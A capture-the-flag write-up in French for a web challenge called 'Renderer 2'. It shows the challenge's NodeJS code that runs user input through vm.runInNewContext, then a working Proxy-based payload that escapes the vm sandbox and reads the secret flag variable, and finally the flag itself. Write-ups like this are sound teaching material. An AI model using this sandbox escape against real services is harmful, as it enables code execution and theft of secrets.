# Renderer 2 🔄
```
500 pts
```

## Description
```
[FR]
Lis le Flag.

[EN]
Read the Flag.

Author: 5c0r7

http://ctf.hackerlab.bj:1026
```

> Ce challenge nous dirige vers une application web équipée d'un outil capable d'interpréter du code NodeJs. Nous avons décidé d'envoyer une simple chaîne 'test' pour observer le comportement de l'outil. Nous avons obtenu une erreur, mais le plus important est que nous avons obtenu le nom du fichier JS. ```3ba648223b8d3b9259881647cc697ab3f7d53cb117bda99a86cee4c5dfa41b1ce8e07b1f4b2681c6ef2e705bb1cdfdefc5cfede9dcb630fd6827e7a1efadab0d.js```

<image src="File/renderer1.png">
  
> Lorsque nous accédons au fichier JS, nous trouvons le code qui se cache derrière l'outil.

```Javascript
const fs = require('fs');
const vm = require('vm');
SECRET = process.env.FLAG;
function executee(code){
	if (code.length != 0) {
		try {
			code_return = vm.runInNewContext(code,vm.createContext(Object.create(null)),{ timeout: 200 });
			if (code_return !== undefined) {
				if (code_return['compil_answer'] !== undefined) compil_answer = {compil_answer: code_return['compil_answer']};
				else compil_answer = {compil_answer: code_return};
			} else compil_answer = {compil_answer: "undefined"};
		} catch (err) {
			compil_answer = {compil_answer: err};
		}
	} else compil_answer = {compil_answer: 'Empty code'};
	return compil_answer;
}
if (process.argv.length === 2) {
    console.error("No code provided!");
    process.exit(1);
}
console.log(executee(process.argv[2]));
```
> Après analyse du code, nous remarquons que le flag se trouve dans la variable ```SECRET``` et que notre entrée est exécutée dans ```vm.runInNewContext()```, cela se fait dans un environnement isolé.

> Apres quelque recherche nous avons trouver un article interressant sur github qui permet de s'echapper de ce genre d'environnement. [Source](https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af)

> En parcourrant cette ressource nous avions trouvé un payload que nous pouvions utiliser pour nous échapper de cette sandbox et ainsi lire la variable ```SECRET```, ```new Proxy({}, {
  get: function(me, key) { (arguments.callee.caller.constructor('console.log(SECRET)'))() }
})```.

> Une fois le payload envoyé, nous obtenons le flag.

<image src="File/renderer4.png">

# Flag
```CTF_w31rd_s@ndb0xxxxx_It5n7_s3cuREEEEEE_hahaha``` 🥳
